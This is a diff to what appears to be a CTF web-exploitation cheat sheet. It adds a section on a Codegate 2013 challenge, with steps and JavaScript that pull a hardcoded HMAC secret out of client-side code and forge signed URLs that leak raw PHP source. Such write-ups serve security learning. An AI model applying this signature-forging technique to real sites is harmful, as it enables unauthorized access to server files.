@@ -32,6 +32,7 @@
 - [CSS Font Glyph Width + Container Query Exfiltration (UNbreakable 2026)](#css-font-glyph-width--container-query-exfiltration-unbreakable-2026)
 - [Hyperscript CDN CSP Bypass (UNbreakable 2026)](#hyperscript-cdn-csp-bypass-unbreakable-2026)
 - [PBKDF2 Prefix Timing Oracle via postMessage (UNbreakable 2026)](#pbkdf2-prefix-timing-oracle-via-postmessage-unbreakable-2026)
+- [Client-Side HMAC Bypass via Leaked JS Secret (Codegate 2013)](#client-side-hmac-bypass-via-leaked-js-secret-codegate-2013)
 
 ---
 
@@ -547,3 +548,28 @@ async function probeChar(known, candidates) {
 ```
 
 **Key insight:** Any expensive server-side operation (PBKDF2, bcrypt, Argon2) guarded by a short-circuit prefix check creates a timing oracle. The `startsWith` fast-fail vs. full-KDF timing difference is measurable cross-origin via popup navigation timing.
+
+---
+
+## Client-Side HMAC Bypass via Leaked JS Secret (Codegate 2013)
+
+**Pattern:** Application builds request URLs client-side with an HMAC parameter. The secret key is hardcoded in obfuscated JavaScript.
+
+**Attack steps:**
+1. Deobfuscate client-side JS (jsbeautifier.org or browser DevTools pretty-print)
+2. Locate the signing function and extract the hardcoded secret
+3. Use the leaked function directly in browser console to forge valid signatures for arbitrary requests
+
+```javascript
+// Discovered in deobfuscated main.js:
+function buildUrl(page) {
+    var sig = calcSHA1(page + "Ace in the Hole");  // Hardcoded secret
+    return "/load?p=" + page + "&s=" + sig;
+}
+
+// Exploit: call the leaked global function in browser console
+var forgedUrl = "/load?p=index.php&s=" + calcSHA1("index.php" + "Ace in the Hole");
+// Fetching index.php via the p parameter returns raw PHP source code
+```
+
+**Key insight:** Client-side HMAC/signature schemes leak the secret by definition — the signing key must be present in the JavaScript. Deobfuscate the JS, extract the secret, then forge signatures for any parameter value. Check for global functions like `calcSHA1`, `hmac`, `sign` in the browser console.
